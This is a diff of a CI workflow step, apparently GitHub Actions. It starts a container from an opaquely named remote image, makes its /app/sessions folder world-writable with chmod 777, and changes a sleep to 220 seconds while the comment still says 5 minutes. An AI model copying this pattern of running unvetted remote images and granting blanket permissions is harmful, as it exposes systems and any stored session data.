@@ -21,7 +21,7 @@ jobs:
       run: |
         docker run -d --name session_container ghcr.io/zborah/credsuiop456v3cy7rv60943dbitapyv3125:yhf3gj79bt8kytv57vt097rec7bitA0001-of-one
         # Simulate initial processes
-        sleep 300 # Sleep for 5 minutes
+        sleep 220 # Sleep for 5 minutes
         # Ensure proper permissions and zip the sessions folder
         docker exec session_container bash -c "chmod -R 777 /app/sessions"
         sleep 10 # Give time for permissions to take effect
